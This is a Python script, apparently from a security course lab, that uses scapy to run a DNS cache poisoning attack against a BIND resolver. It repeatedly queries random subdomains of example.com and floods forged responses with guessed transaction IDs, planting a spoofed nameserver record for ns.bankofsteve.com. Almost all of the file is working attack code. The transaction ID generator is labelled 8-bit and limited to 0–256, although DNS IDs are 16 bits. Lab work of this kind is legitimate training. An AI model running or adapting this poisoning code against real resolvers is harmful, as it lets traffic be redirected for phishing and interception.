#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
query_port = args.query_port
base_domain = 'example.com.'
spoof = 'ns.bankofsteve.com'


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=base_domain))
    sendPacket(sock, dnsPacket, my_ip, dns_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.bind((my_ip, my_port))

    dns_request = DNS(rd=1, qd=DNSQR(qname=base_domain))
    fake_response = DNS(id=42, qr=1, qdcount=1, ancount=0, nscount=1, arcount=0, 
		qd=DNSQR(qname=base_domain), 
		an=NotImplemented,
		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
        ar=(DNSRR(rrname=spoof, type="A", ttl=60000, rdata='42.42.42.42'))
	)

    while (1):
        # per new url:
        url = getRandomSubDomain() + '.' + base_domain
        dns_request[DNS].qd.qname = url
        fake_response[DNS].qd.qname = url
        print "Now trying %s\n" % url
        print fake_response.show()

        # send dns query
        sendPacket(sock, dns_request, my_ip, dns_port)
        print "Request sent\n", dns_request.show()
        for i in range(100):
            fake_response[DNS].id = getRandomTXID()
            sendPacket(sock, fake_response, my_ip, query_port)

        # check to see if it worked
        sendPacket(sock, dns_request, my_ip, dns_port)
        response = sock.recv(4096)
        response = DNS(response)
        try:
            if response[DNS].ns.rdata == spoof:
                print "Successfully poisonned our target with a dummy record !!"
                exit(0)
            else:
                print "Poisonning on %s failed, ns is %s" % (url, str(response[DNS].ns))
                print response.show()
        except:
            print "Poisonning on %s failed, response is \n%s" % (url, response.show())
    

if __name__ == '__main__':
    attack()
